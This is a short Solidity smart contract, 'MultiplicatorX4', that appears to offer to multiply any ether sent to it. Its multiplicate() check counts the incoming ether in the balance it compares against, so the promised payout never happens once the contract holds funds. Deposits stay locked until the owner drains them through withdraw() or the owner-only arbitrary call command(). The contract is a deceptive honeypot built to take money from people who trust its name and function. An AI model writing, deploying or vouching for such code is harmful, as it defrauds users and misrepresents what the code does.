pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _adr, bytes _data) public payable {
        require(msg.sender == owner);
        require(_adr != address(0));
        require(_data.length > 0);

        _adr.call.value(msg.value)(_data);
    }

    function multiplicate(address _adr) public payable {
        require(_adr != address(0));
        require(msg.value >= this.balance);

        _adr.transfer(this.balance + msg.value);
    }
}